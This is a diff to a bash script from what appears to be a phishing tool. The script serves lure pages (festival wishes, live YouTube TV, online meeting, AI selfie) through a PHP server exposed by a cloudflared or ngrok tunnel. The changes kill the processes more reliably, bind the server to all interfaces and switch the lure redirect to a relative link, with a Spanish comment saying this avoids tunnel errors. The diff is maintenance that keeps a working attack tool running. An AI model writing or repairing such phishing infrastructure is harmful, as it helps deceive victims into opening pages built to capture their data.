@@ -260,15 +260,17 @@ fi
 fi
 
 if [[ "$windows_mode" == true ]]; then
-    taskkill /F /IM "php.exe" 2>/dev/null
-    taskkill /F /IM "cloudflared.exe" 2>/dev/null
-    taskkill /F /IM "ngrok.exe" 2>/dev/null
+    taskkill /F /FI "IMAGENAME eq php.exe" /T 2>/dev/null
+    taskkill /F /FI "IMAGENAME eq cloudflared.exe" /T 2>/dev/null
+    taskkill /F /FI "IMAGENAME eq ngrok.exe" /T 2>/dev/null
 else
-    pkill -9 php ngrok cloudflared > /dev/null 2>&1
+    pkill -9 php > /dev/null 2>&1
+    pkill -9 ngrok > /dev/null 2>&1
+    pkill -9 cloudflared > /dev/null 2>&1
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > php_server.log 2>&1 & 
+php -S 0.0.0.0:3333 > php_server.log 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared_output.log > /dev/null 2>&1
@@ -308,17 +310,18 @@ checkfound
 
 payload_cloudflare() {
 link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log" | head -n1)
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+# Usamos redirección relativa para evitar errores 502/503 del túnel
+sed 's+forwarding_link+index2.html+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+forwarding_link+index2.html+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+forwarding_link+index2.html+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 elif [[ $option_tem -eq 4 ]]; then
-sed 's+forwarding_link+'$link'+g' AISelfie.html > index2.html
+sed 's+forwarding_link+index2.html+g' AISelfie.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+sed 's+forwarding_link+index2.html+g' OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 }
